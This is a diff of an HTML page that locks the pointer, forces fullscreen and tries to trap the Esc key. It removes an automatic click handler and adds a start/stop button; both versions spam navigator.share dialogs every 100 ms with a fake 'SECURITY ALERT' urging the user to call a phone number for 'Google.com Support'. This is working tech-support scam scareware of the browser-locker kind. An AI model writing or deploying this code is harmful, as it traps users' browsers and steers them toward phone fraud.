@@ -28,21 +28,50 @@
         font-size: 16px;
         color: #666;
       }
+      #share-button {
+        margin-top: 15px;
+        padding: 10px 20px;
+        font-size: 16px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+      #share-button:hover {
+        background-color: #45a049;
+      }
+      #share-button:disabled {
+        background-color: #cccccc;
+        cursor: not-allowed;
+      }
+      #share-status {
+        margin-top: 10px;
+        font-size: 14px;
+        color: #999;
+      }
     </style>
   </head>
   <body>
     <canvas id="canvas" width="800" height="600"></canvas>
     <div id="status">
       Click canvas to lock pointer & enter fullscreen. Press 'L' to toggle Esc
-      lock. v301
+      lock.
     </div>
     <div id="esc-status">Esc Key: Unlocked</div>
+    <button id="share-button">Start Share Navigation</button>
+    <div id="share-status"></div>
     <script>
       const canvas = document.getElementById("canvas");
       const ctx = canvas.getContext("2d");
       const escStatus = document.getElementById("esc-status");
+      const shareButton = document.getElementById("share-button");
+      const shareStatus = document.getElementById("share-status");
       let isEscLocked = false;
       let isFullscreen = false;
+      let shareInterval = null;
+
       // Request pointer lock and fullscreen on click
       canvas.addEventListener("click", async () => {
         try {
@@ -55,12 +84,50 @@
             canvas.mozRequestPointerLock ||
             canvas.webkitRequestPointerLock;
           canvas.requestPointerLock();
-          // Add navigator share on click
-          setInterval(() => { navigator.share({title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support', text: 'Call 123-456-7890'}); }, 100);
         } catch (err) {
           console.error("Failed to enter fullscreen or pointer lock:", err);
         }
       });
+
+      // Handle share button click with 1 second delay
+      shareButton.addEventListener("click", () => {
+        if (shareInterval) {
+          // Stop sharing
+          clearInterval(shareInterval);
+          shareInterval = null;
+          shareButton.textContent = "Start Share Navigation";
+          shareStatus.textContent = "";
+          shareButton.disabled = false;
+        } else {
+          // Start sharing with 1 second delay
+          shareButton.disabled = true;
+          shareStatus.textContent = "Starting in 1 second...";
+          
+          setTimeout(() => {
+            shareStatus.textContent = "Share navigation active";
+            shareButton.textContent = "Stop Share Navigation";
+            shareButton.disabled = false;
+            
+            shareInterval = setInterval(() => {
+              if (navigator.share) {
+                navigator.share({
+                  title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support',
+                  text: 'Call 123-456-7890'
+                }).catch(err => {
+                  console.log("Share cancelled or failed:", err);
+                });
+              } else {
+                console.log("Navigator.share not supported");
+                clearInterval(shareInterval);
+                shareInterval = null;
+                shareButton.textContent = "Start Share Navigation";
+                shareStatus.textContent = "Share API not supported in this browser";
+              }
+            }, 100);
+          }, 1000); // 1 second delay
+        }
+      });
+
       // Handle pointer lock change
       document.addEventListener("pointerlockchange", lockChangeAlert, false);
       document.addEventListener("mozpointerlockchange", lockChangeAlert, false);
@@ -69,6 +136,7 @@
         lockChangeAlert,
         false
       );
+
       // Handle fullscreen change
       document.addEventListener(
         "fullscreenchange",
@@ -85,6 +153,7 @@
         fullscreenChangeAlert,
         false
       );
+
       function lockChangeAlert() {
         if (
           document.pointerLockElement === canvas ||
@@ -107,6 +176,7 @@
           }
         }
       }
+
       function fullscreenChangeAlert() {
         if (!document.fullscreenElement) {
           isFullscreen = false;
@@ -120,6 +190,7 @@
           }
         }
       }
+
       // Track mouse movement
       let x = 400,
         y = 300;
@@ -130,12 +201,14 @@
         y = Math.max(0, Math.min(600, y));
         draw();
       }
+
       // Draw
       function draw() {
         ctx.clearRect(0, 0, 800, 600);
         ctx.fillStyle = "red";
         ctx.fillRect(x - 10, y - 10, 20, 20);
       }
+
       // Handle keydown
       async function handleKeyDown(e) {
         if (e.key === "l" || e.key === "L") {
@@ -150,6 +223,7 @@
           e.preventDefault(); // Try to prevent default, but won't stop browser exit
         }
       }
+
       // Lock Esc
       async function lockEsc() {
         try {
@@ -166,6 +240,7 @@
           console.error("Failed to lock Esc:", err);
         }
       }
+
       // Unlock Esc
       function unlockEsc() {
         if ("keyboard" in navigator) {
@@ -175,6 +250,14 @@
           console.log("Esc key unlocked");
         }
       }
+
+      // Clean up on page unload
+      window.addEventListener("beforeunload", () => {
+        if (shareInterval) {
+          clearInterval(shareInterval);
+        }
+      });
+
       draw();
     </script>
   </body>
